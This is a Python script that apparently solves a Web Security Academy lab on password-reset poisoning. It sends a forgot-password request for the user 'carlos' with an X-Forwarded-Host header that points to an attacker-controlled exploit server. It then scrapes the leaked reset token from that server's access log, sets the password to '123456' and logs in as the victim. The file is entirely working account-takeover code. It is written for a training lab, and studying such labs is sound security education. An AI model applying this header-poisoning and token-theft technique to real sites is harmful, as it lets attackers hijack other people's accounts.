from web_security_academy.core.exploit_server import ExploitServer
from web_security_academy.core.logger import logger
from urllib.parse import urlparse

import re


def solve_lab(session):
    exploit_server = ExploitServer(session)
    host = urlparse(exploit_server.url).netloc

    logger.info(
        'Generating a password reset email for "carlos" adding the following header:'
    )
    headers = {"X-Forwarded-Host": host}
    logger.info(headers)
    session.post_path(
        "/forgot-password",
        headers=headers,
        data={"username": "carlos"},
    )

    logger.info("Extracting password reset token from exploit server log...")
    log = exploit_server.access_log()
    tokens = re.findall(
        r"(?<=\/forgot-password\?temp-forgot-password-token=)[^ ]+", log
    )
    if len(tokens) == 0:
        logger.failure("Unable to extract password reset token.")
        return
    else:
        token = tokens[-1]
        logger.success(f"Token: {token}")

    password = "123456"
    data = {
        "temp-forgot-password-token": token,
        "new-password-1": password,
        "new-password-2": password,
    }
    logger.info('Changing carlos\'s password to "123456"...')
    session.post_path("/forgot-password", data=data)
    session.login("carlos", password, with_csrf=False)
